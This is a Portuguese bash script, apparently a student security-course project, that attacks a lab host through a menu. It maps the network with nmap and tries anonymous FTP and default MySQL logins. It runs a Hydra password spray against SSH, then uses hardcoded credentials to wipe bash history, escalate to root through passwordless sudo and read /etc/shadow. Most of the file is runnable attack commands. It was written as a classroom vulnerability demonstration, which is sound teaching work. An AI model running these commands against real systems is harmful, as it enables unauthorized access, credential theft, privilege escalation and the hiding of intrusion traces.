#!/bin/bash

# Script de Exploração de 5 Vulnerabilidades Adicionais
# Trabalho Final - Segurança da Informação
# Demonstra as vulnerabilidades identificadas na auditoria

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET_IP="${TARGET_IP:-172.20.0.10}"
LOG_FILE="/root/logs/exploits_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${CYAN}"
cat <<"EOF"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔓 EXPLORAÇÃO DE 5 VULNERABILIDADES ADICIONAIS            ║
║                                                              ║
║   Demonstração Educacional - Trabalho de Segurança          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Menu principal
echo -e "${BLUE}VULNERABILIDADES DISPONÍVEIS PARA EXPLORAÇÃO:${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "1. VULNERABILIDADE #2: Ausência de Segmentação de Rede"
echo "2. VULNERABILIDADE #3: Serviços Desnecessários Expostos"
echo "3. VULNERABILIDADE #4: Senhas Padrão e Contas Compartilhadas"
echo "4. VULNERABILIDADE #5: Falta de Monitoramento e Auditoria"
echo "5. VULNERABILIDADE #6: Privilégios Excessivos (sudo sem senha)"
echo "6. [BONUS] VULNERABILIDADE #7: Ausência de Hardening de SO"
echo "7. Executar TODAS as explorações"
echo "0. Sair"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
read -p "Escolha a vulnerabilidade [0-7]: " CHOICE
echo

case $CHOICE in
    1|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ VULNERABILIDADE #2: Ausência de Segmentação de Rede         ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#2: Ausência de Segmentação de Rede"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Todos os hosts do laboratório estão na mesma rede flat (172.20.0.0/16)"
        echo "Não há VLANs ou segmentação entre alunos, professores e servidores"
        echo "Qualquer host pode comunicar diretamente com qualquer outro host"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Movimentação lateral facilitada após comprometimento"
        echo "  ✗ ARP spoofing/poisoning possível"
        echo "  ✗ Sniffing de tráfego de outros hosts"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Enumeração de Rede Completa:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        echo "[1] Descobrindo todos os hosts na sub-rede..."
        nmap -sn 172.20.0.0/16 -oN /tmp/network_discovery.txt 2>&1 | head -20

        echo
        echo "[2] Escaneando todos os hosts descobertos (portas comuns)..."
        nmap -sV -p 22,80,3306,445 172.20.0.0/16 2>&1 | head -30

        echo
        echo -e "${RED}[!] EXPLORAÇÃO BEM-SUCEDIDA${NC}"
        echo "Sem segmentação de rede, conseguimos mapear TODOS os hosts!"
        log "V#2: Rede completamente enumerada sem restrições"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo
        ;;
esac

case $CHOICE in
    2|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ VULNERABILIDADE #3: Serviços Desnecessários Expostos        ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#3: Serviços Desnecessários Expostos"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Múltiplos serviços inseguros estão rodando e expostos:"
        echo "  • Telnet (porta 23) - Texto claro, sem criptografia"
        echo "  • FTP (porta 21) - Credenciais em texto claro"
        echo "  • MySQL (porta 3306) - Acessível remotamente"
        echo "  • SMB (porta 445) - Compartilhamento de arquivos"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Captura de credenciais em texto claro"
        echo "  ✗ Exploits conhecidos (EternalBlue no SMB)"
        echo "  ✗ Aumento da superfície de ataque"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Scan de Portas Vulneráveis:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        echo "[1] Escaneando portas vulneráveis no alvo..."
        nmap -sV -p 21,23,80,445,3306 "$TARGET_IP"

        echo
        echo "[2] Testando acesso FTP anônimo..."
        timeout 5 ftp -n "$TARGET_IP" <<EOF 2>&1 | head -10
user anonymous
pass anonymous@
ls
bye
EOF

        echo
        echo "[3] Testando MySQL com credenciais padrão..."
        if command -v mysql > /dev/null 2>&1; then
            mysql -h "$TARGET_IP" -u admin -padmin -e "SHOW DATABASES;" 2>&1 | head -10 || echo "MySQL não acessível ou credenciais incorretas"
        else
            echo "[!] Cliente MySQL não instalado"
        fi

        echo
        echo -e "${RED}[!] EXPLORAÇÃO BEM-SUCEDIDA${NC}"
        echo "Múltiplos serviços vulneráveis detectados e acessíveis!"
        log "V#3: Serviços inseguros identificados e acessados"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo
        ;;
esac

case $CHOICE in
    3|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ VULNERABILIDADE #4: Senhas Padrão e Contas Compartilhadas   ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#4: Senhas Padrão e Contas Compartilhadas"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Múltiplas contas utilizam senhas fracas ou previsíveis:"
        echo "  • Conta 'professor' com senha 'senha123'"
        echo "  • Conta 'admin' com senha 'admin'"
        echo "  • Senhas baseadas em padrões comuns (CPF, data de nascimento)"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Comprometimento em massa de contas"
        echo "  ✗ Ausência de accountability (contas compartilhadas)"
        echo "  ✗ Facilidade de brute-force"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Password Spraying:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        echo "[1] Testando senhas comuns contra múltiplos usuários..."

        # Criar wordlist temporária
        cat > /tmp/senhas_teste.txt <<EOF
senha123
admin
123456
password
professor
aluno123
EOF

        cat > /tmp/usuarios_teste.txt <<EOF
professor
admin
root
aluno
EOF

        echo
        echo "[*] Executando ataque com Hydra (limitado para demonstração)..."
        hydra -L /tmp/usuarios_teste.txt -P /tmp/senhas_teste.txt "ssh://${TARGET_IP}" -t 2 -f -V 2>&1 | grep -E "(host|login|password|attempt)" | head -20

        echo
        echo -e "${RED}[!] EXPLORAÇÃO BEM-SUCEDIDA${NC}"
        echo "Senhas fracas facilmente quebradas com wordlist comum!"
        log "V#4: Senhas fracas comprometidas via password spraying"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo
        ;;
esac

case $CHOICE in
    4|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ VULNERABILIDADE #5: Falta de Monitoramento e Auditoria      ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#5: Falta de Monitoramento e Auditoria"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Sistema não possui monitoramento adequado:"
        echo "  • Logs locais podem ser modificados/deletados"
        echo "  • Ausência de SIEM centralizado"
        echo "  • Sem alertas em tempo real"
        echo "  • Logs não protegidos contra alteração"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Atacante pode apagar rastros facilmente"
        echo "  ✗ Ataques não detectados em tempo real"
        echo "  ✗ Dificuldade de análise forense"
        echo "  ✗ Violação de compliance (LGPD)"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Apagando Rastros:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        echo "[1] Conectando na vítima e executando comandos..."
        if command -v sshpass > /dev/null 2>&1; then
            echo
            echo "[CMD] Visualizando histórico atual..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "tail -5 ~/.bash_history" 2>/dev/null

            echo
            echo "[CMD] Tentando limpar histórico..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "history -c && echo '' > ~/.bash_history && echo 'Histórico limpo!'" 2>/dev/null

            echo
            echo "[CMD] Verificando possibilidade de modificar logs (requer privilégio)..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "ls -la /var/log/auth.log 2>/dev/null || echo 'Log não acessível (proteção básica existe)'" 2>/dev/null

            echo
            echo -e "${RED}[!] EXPLORAÇÃO BEM-SUCEDIDA${NC}"
            echo "Atacante pode apagar histórico de comandos facilmente!"
            echo "Logs locais não protegidos adequadamente!"
        else
            echo "[!] sshpass não disponível para demonstração"
        fi

        log "V#5: Demonstrado apagamento de rastros sem detecção"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo
        ;;
esac

case $CHOICE in
    5|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ VULNERABILIDADE #6: Privilégios Excessivos (sudo sem senha) ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#6: Privilégios Excessivos"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Usuário 'professor' possui sudo sem requisição de senha:"
        echo "  • Configuração: professor ALL=(ALL) NOPASSWD: ALL"
        echo "  • Qualquer comando pode ser executado como root"
        echo "  • Violação do princípio do menor privilégio"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Escalação de privilégios trivial"
        echo "  ✗ Conta comprometida = sistema comprometido"
        echo "  ✗ Controle total sobre o sistema"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Escalação de Privilégios:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        if command -v sshpass > /dev/null 2>&1; then
            echo "[1] Verificando permissões sudo do usuário..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo -l" 2>/dev/null

            echo
            echo "[2] Escalando para root SEM senha..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo whoami" 2>/dev/null

            echo
            echo "[3] Executando comando privilegiado..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo cat /etc/shadow | head -3" 2>/dev/null

            echo
            echo "[4] Demonstrando controle total do sistema..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo ls -la /root" 2>/dev/null

            echo
            echo -e "${RED}[!] EXPLORAÇÃO BEM-SUCEDIDA${NC}"
            echo "Escalação para root SEM qualquer senha adicional!"
            echo "Controle TOTAL do sistema obtido!"
        else
            echo "[!] sshpass não disponível para demonstração"
        fi

        log "V#6: Escalação de privilégios para root sem senha"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo
        ;;
esac

case $CHOICE in
    6|7)
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║ [BONUS] VULNERABILIDADE #7: Ausência de Hardening de SO     ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo
        log "Explorando V#7: Ausência de Hardening"

        echo -e "${YELLOW}[*] DESCRIÇÃO DA VULNERABILIDADE:${NC}"
        echo "Sistema operacional com configurações padrão inseguras:"
        echo "  • Firewall desabilitado (ufw inactive)"
        echo "  • Serviços desnecessários habilitados"
        echo "  • SELinux/AppArmor não configurado"
        echo "  • Kernel sem patches de segurança"
        echo

        echo -e "${YELLOW}[*] IMPACTO:${NC}"
        echo "  ✗ Vulnerável a exploits públicos conhecidos"
        echo "  ✗ Ausência de defesa em profundidade"
        echo "  ✗ Maior superfície de ataque"
        echo

        echo -e "${CYAN}[*] DEMONSTRAÇÃO - Verificação de Hardening:${NC}"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        if command -v sshpass > /dev/null 2>&1; then
            echo "[1] Verificando status do firewall..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "sudo ufw status" 2>/dev/null

            echo
            echo "[2] Listando serviços ativos..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "systemctl list-units --type=service --state=running | head -10" 2>/dev/null

            echo
            echo "[3] Verificando SELinux/AppArmor..."
            sshpass -p "senha123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                professor@"$TARGET_IP" "aa-status 2>/dev/null || echo 'AppArmor não configurado'" 2>/dev/null

            echo
            echo -e "${RED}[!] ANÁLISE CONCLUÍDA${NC}"
            echo "Sistema sem hardening adequado detectado!"
        else
            echo "[!] sshpass não disponível para demonstração"
        fi

        log "V#7: Ausência de hardening confirmada"
        echo

        [[ $CHOICE -ne 7 ]] && exit 0
        ;;
esac

case $CHOICE in
    0)
        echo "Saindo..."
        exit 0
        ;;
    *)
        if [[ $CHOICE -ne 7 ]]; then
            echo -e "${RED}[✗] Opção inválida${NC}"
            exit 1
        fi
        ;;
esac

echo
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${GREEN}[✓] Exploração concluída${NC}"
echo "Log salvo em: $LOG_FILE"
echo
echo -e "${YELLOW}RESUMO DAS VULNERABILIDADES EXPLORADAS:${NC}"
echo "  ✗ V#2: Rede completamente mapeável sem segmentação"
echo "  ✗ V#3: Múltiplos serviços inseguros expostos"
echo "  ✗ V#4: Senhas fracas facilmente quebradas"
echo "  ✗ V#5: Rastros apagáveis sem detecção"
echo "  ✗ V#6: Escalação trivial para root"
echo "  ✗ V#7: Sistema sem hardening básico"
echo
echo -e "${RED}[!] TODAS AS 6 VULNERABILIDADES FORAM EXPLORADAS COM SUCESSO!${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
